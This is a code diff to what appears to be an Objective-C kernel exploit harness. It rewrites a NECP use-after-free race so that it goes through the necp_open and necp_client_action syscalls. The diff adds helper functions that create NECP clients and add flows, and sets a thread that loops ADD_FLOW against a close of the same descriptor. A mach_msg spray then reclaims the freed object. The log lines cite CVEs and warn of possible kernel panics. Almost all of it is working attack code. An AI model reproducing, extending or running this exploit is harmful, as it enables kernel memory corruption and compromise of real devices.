@@ -30,7 +30,7 @@
 #import <mach/message.h>
 #import <stdarg.h>
 
-#define P053_BUILD @"p053-flow-add-close-race-v2"
+#define P053_BUILD @"p053-flow-add-close-race-v3-necpopen"
 #define SO_NECP_ATTRIBUTES ((int)A14_23F77_SO_NECP_ATTRIBUTES)
 
 static int g_log_fd = -1;
@@ -80,13 +80,68 @@ static int create_necp_socket(void) {
     return fd;
 }
 
+/* ═══ v3 (2026-11-24): the necp_open(463) route ═══
+   The 24B156 receipt: SO_NECP_ATTRIBUTES on a UDP socket is rejected on 27.2.1
+   (v2 died at PHASE 1 with no socket at all). p179 proved the working vehicle
+   on the SAME build: necp_open(463) + necp_client_action(464) with
+   ADD(1) / ADD_FLOW(0x11). v3 races ADD_FLOW x close on the SAME fd — the
+   CVE-2026-84507 shape through the syscall door. The old socket route stays
+   as the honest control row (its failure IS a receipt on this build). */
+
+#ifndef SYS_necp_open
+#define SYS_necp_open 463
+#endif
+#ifndef SYS_necp_client_action
+#define SYS_necp_client_action 464
+#endif
+#define P053_ACTION_ADD       1u
+#define P053_ACTION_ADD_FLOW  0x11u
+
+static uint8_t g_p053_cid[16];
+
+/* the p179-proven client factory: necp_open + ADD -> (fd, cid) */
+static int p053_necp_open_client(uint8_t cid_out[16]) {
+    int fd = (int)syscall(SYS_necp_open, 0);
+    if (fd < 0) fd = (int)syscall(SYS_necp_open, (int)getpid());
+    if (fd < 0) return -1;
+    uint8_t params[0x80];
+    memset(params, 0, sizeof params);
+    if (cid_out) memset(cid_out, 0, 16);
+    long rc = syscall(SYS_necp_client_action, fd,
+                      (uint64_t)P053_ACTION_ADD,
+                      cid_out ? cid_out : (uint8_t *)"",
+                      (size_t)0x10, params, (size_t)sizeof params);
+    if (rc != 0) { close(fd); return -1; }
+    return fd;
+}
+
+/* the p179-proven ADD_FLOW shape (req in [0x23,0xf0], flags 0x00 working) */
+static int p053_add_flow(int fd, const uint8_t cid[16], uint16_t port) {
+    uint8_t req[0x30];
+    memset(req, 0, sizeof req);
+    uint8_t sa[16];
+    memset(sa, 0, sizeof sa);
+    sa[0] = 16;                       /* sin_len */
+    sa[1] = AF_INET;                  /* sin_family */
+    sa[2] = (uint8_t)(port >> 8);     /* sin_port BE */
+    sa[3] = (uint8_t)(port & 0xff);
+    sa[4] = 127; sa[5] = 0; sa[6] = 0; sa[7] = 1;
+    memcpy(req + 0x10, sa, 16);       /* +0x10: the local sockaddr */
+    *(uint16_t *)(req + 0x20) = 0;    /* +0x20: flags (0x00 = the working shape) */
+    long rc = syscall(SYS_necp_client_action, fd,
+                      (uint64_t)P053_ACTION_ADD_FLOW,
+                      (const void *)cid, (size_t)0x10,
+                      (const void *)req, sizeof req);
+    return (int)rc;
+}
+
 /*
- * THE RACE: flow_add × close on SAME fd
+ * THE RACE: flow_add x close on SAME fd
  *
- * Thread A: connect(fd) in tight loop → necp_client_add_flow
- * Thread B: close(fd) after delay → necp_client_remove (frees NECP client)
+ * Thread A: ADD_FLOW(0x11) in tight loop -> necp_client_add_flow
+ * Thread B: close(fd) after delay -> necp_client_remove (frees NECP client)
  *
- * If Thread A is inside connect() when Thread B closes:
+ * If Thread A is inside ADD_FLOW when Thread B closes:
  *   - close frees the NECP client
  *   - connect tries to add flow to freed NECP client → UAF
  *   - mach_msg spray reclaims freed NECP client → corruption
@@ -117,7 +172,7 @@ static void *p053_connect_thread(void *arg) {
         int fd = g_race_fd;
         if (fd < 0) {
             /* Socket was closed by Thread B, create a new one */
-            fd = create_necp_socket();
+            fd = p053_necp_open_client(g_p053_cid);
             if (fd >= 0) {
                 g_race_fd = fd;
                 g_fd_closed = 0;
@@ -127,9 +182,10 @@ static void *p053_connect_thread(void *arg) {
             }
         }
         
-        /* Rapidly call connect to add flows */
-        addr.sin_port = htons((uint16_t)(alt_port++ & 0xFFFF));
-        int ret = connect(fd, (struct sockaddr *)&addr, sizeof(addr));
+        /* Rapidly ADD_FLOW (the v3 necp_open route — 27.2.1 rejects the
+           SO_NECP_ATTRIBUTES socket, p179 proved this syscall shape) */
+        int ret = p053_add_flow(fd, g_p053_cid,
+                                 (uint16_t)(alt_port++ & 0xFFFF));
         if (ret == 0) {
             g_connect_iters++;
         } else {
@@ -272,34 +328,45 @@ static void *p053_check_thread(void *arg) {
     p053_log(log, @"CVE-2026-84561: flow_registration_count underflow → double-free");
     p053_log(log, @"");
     p053_log(log, @"KEY DIFFERENCE FROM v1:");
-    p053_log(log, @"  v1: client_add × client_close on DIFFERENT sockets (no shared object)");
-    p053_log(log, @"  v2: flow_add (connect) × close on SAME fd (UAF on NECP client)");
+    p053_log(log, @"  v1: client_add x client_close on DIFFERENT sockets (no shared object)");
+    p053_log(log, @"  v2: flow_add (connect) x close on SAME fd (UAF on NECP client)");
+    p053_log(log, @"  v3: same race through necp_open(463)+ADD_FLOW(0x11) -- the ");
+    p053_log(log, @"      27.2.1 receipt killed the SO_NECP_ATTRIBUTES socket; p179 ");
+    p053_log(log, @"      proved THIS syscall shape on the same build");
     p053_log(log, @"");
     p053_log(log, @"P024 proved setsockopt×setsockopt is locked.");
     p053_log(log, @"v2 tests connect×close — DIFFERENT kernel paths.");
     p053_log(log, @"");
     
-    /* ═══ PHASE 1: Test basic NECP socket creation ═══ */
-    p053_log(log, @"[PHASE 1] Testing NECP socket + connect");
-    
+    /* ═══ PHASE 1: dual route — the v2 socket control row, then the v3 vehicle ═══ */
+    p053_log(log, @"[PHASE 1] NECP client creation (v2 socket control + v3 necp_open route)");
+
     int testFd = create_necp_socket();
     if (testFd < 0) {
-        p053_log(log, @"[-] NECP socket creation failed");
+        p053_log(log, @"[-] v2 socket route DEAD on this build (setsockopt "
+                      @"SO_NECP_ATTRIBUTES errno=%d) -- the 24B156 receipt; "
+                      @"v3 continues on necp_open(463)", errno);
+    } else {
+        p053_log(log, @"[+] v2 socket route live: fd=%d (also kept as a lane)",
+                 testFd);
+        close(testFd);
+    }
+
+    uint8_t cid[16];
+    memset(cid, 0, sizeof cid);
+    int nfd = p053_necp_open_client(cid);
+    if (nfd < 0) {
+        p053_log(log, @"[-] necp_open(463) failed errno=%d -- honest row", errno);
         if (g_log_fd >= 0) { fcntl(g_log_fd, F_FULLFSYNC); close(g_log_fd); g_log_fd = -1; }
         return log;
     }
-    p053_log(log, @"[+] NECP socket created: fd=%d", testFd);
-    
-    /* Test connect (adds flow) */
-    struct sockaddr_in testAddr;
-    memset(&testAddr, 0, sizeof(testAddr));
-    testAddr.sin_family = AF_INET;
-    testAddr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
-    testAddr.sin_port = htons(12345);
-    int ret = connect(testFd, (struct sockaddr *)&testAddr, sizeof(testAddr));
-    p053_log(log, @"[+] connect() ret=%d errno=%d (flow add)", ret, errno);
-    close(testFd);
-    p053_log(log, @"[+] NECP socket closed (client + flow removed)");
+    p053_log(log, @"[+] v3 necp_open fd=%d cid=%02x%02x%02x%02x...",
+             nfd, cid[0], cid[1], cid[2], cid[3]);
+    int fret = p053_add_flow(nfd, cid, 12345);
+    p053_log(log, @"[+] ADD_FLOW(0x11) rc=%d errno=%d (the p179-proven shape)",
+             fret, errno);
+    close(nfd);
+    p053_log(log, @"[+] necp fd closed (client + flow removed)");
     
     /* ═══ PHASE 2: flow_add × close race ═══ */
     p053_log(log, @"");
@@ -319,9 +386,11 @@ static void *p053_check_thread(void *arg) {
     g_race_hits = 0;
     memset(g_ports, 0, sizeof(g_ports));
     
-    /* Create initial NECP socket */
-    g_race_fd = create_necp_socket();
-    p053_log(log, @"[+] Initial NECP socket: fd=%d", g_race_fd);
+    /* Create the initial v3 NECP client */
+    memset(g_p053_cid, 0, sizeof g_p053_cid);
+    g_race_fd = p053_necp_open_client(g_p053_cid);
+    p053_log(log, @"[+] Initial v3 NECP client: fd=%d (ADD_FLOW x close on "
+                  @"the SAME fd -- PANIC-POSSIBLE)", g_race_fd);
     
     pthread_t connect_tid, close_tid, spray_tid, check_tid;
     pthread_create(&connect_tid, NULL, p053_connect_thread, NULL);
